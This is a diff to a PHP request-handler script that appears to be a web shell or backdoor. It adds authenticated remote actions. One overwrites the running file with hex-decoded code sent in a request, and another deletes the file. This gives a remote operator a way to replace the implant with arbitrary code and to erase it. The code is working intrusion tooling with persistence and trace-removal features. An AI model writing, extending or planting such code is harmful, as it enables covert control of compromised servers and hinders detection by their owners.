@@ -34,8 +34,10 @@ class Handler
     private $RES_STATUS_KEY                  = "status";
     private $RES_MESSAGE_KEY                 = "message";
 
-    private $ACTION_STATUS                   = "0";
-    private $ACTION_INVOKE                   = "1";
+    public $ACTION_STATUS                    = "0";
+    public $ACTION_INVOKE                    = "1";
+    public $ACTION_UPDATE                    = "5";
+    public $ACTION_DELETE                    = "6";
 
     private $MOD_RES_STATUS                  = "status";
     private $MOD_RES_MESSAGE                 = "message";
@@ -285,6 +287,41 @@ class Handler
         return $this->generate_response($mod_status, $mod_data);
     }
 
+    private function do_update($unpacked_request)
+    {
+        $response = "";
+        
+        if (!array_key_exists($this->REQ_MSG_KEY, $unpacked_request))
+            return $this->generate_response($this->ERR_CODE, $this->ERR_NONEXISTENT_ACTION_DATA);
+
+        $action_data = @hex2bin($unpacked_request[$this->REQ_MSG_KEY]);
+        if ($action_data === false)
+            return $this->generate_response($this->ERR_CODE, $this->ERR_INVALID_ACTION_DATA);
+        
+        if (is_writable(__FILE__) === false)
+        {
+            $response = "Can't self-update '" . __FILE__ . "' file is not writable";
+            return $this->generate_response($this->ERR_CODE, $response);
+        }
+
+        $response = "Self-updated '" . __FILE__ . "' checksum '" . md5($action_data) . "'";
+        $GLOBALS["control"] = [$this->ACTION_UPDATE, $action_data];
+        return $this->generate_response($this->SUCC_CODE, $response);
+    }
+
+    private function do_delete()
+    {
+        $response = "Self-delete '" . __FILE__ . "' has been completed";
+        if (is_writable(__FILE__) === false)
+        {
+            $response = "Can't self-delete '" . __FILE__ . "' file is not writable";
+            return $this->generate_response($this->ERR_CODE, $response);
+        }
+        
+        $GLOBALS["control"] = [$this->ACTION_DELETE, ""];
+        return $this->generate_response($this->SUCC_CODE, $response);
+    }
+
     public function handle()
     {
         try
@@ -305,6 +342,10 @@ class Handler
                     return $this->do_status();
                 case $this->ACTION_INVOKE:
                     return $this->do_invoke($unpacked_request);
+                case $this->ACTION_UPDATE:
+                        return $this->do_update($unpacked_request);
+                case $this->ACTION_DELETE:
+                    return $this->do_delete();
                 default:
                     return $this->generate_response($this->ERR_CODE, $this->ERR_UNKNOWN_ACTION);
             }
@@ -316,6 +357,7 @@ class Handler
     }
 }
 
+$control = [];
 $handler = new Handler();
 
 if ($_SERVER['REQUEST_METHOD'] !== $handler->REQUEST_METHOD)
@@ -332,3 +374,15 @@ if (!$handler->authenticate())
 
 $response = $handler->handle();
 print($response);
+
+if (isset($control) && sizeof($control) === 2)
+{
+    if ($control[0] === $handler->ACTION_UPDATE)
+    {
+        file_put_contents(__FILE__, $control[1]);
+    }
+    elseif ($control[0] === $handler->ACTION_DELETE)
+    {
+        unlink(__FILE__);
+    }
+}
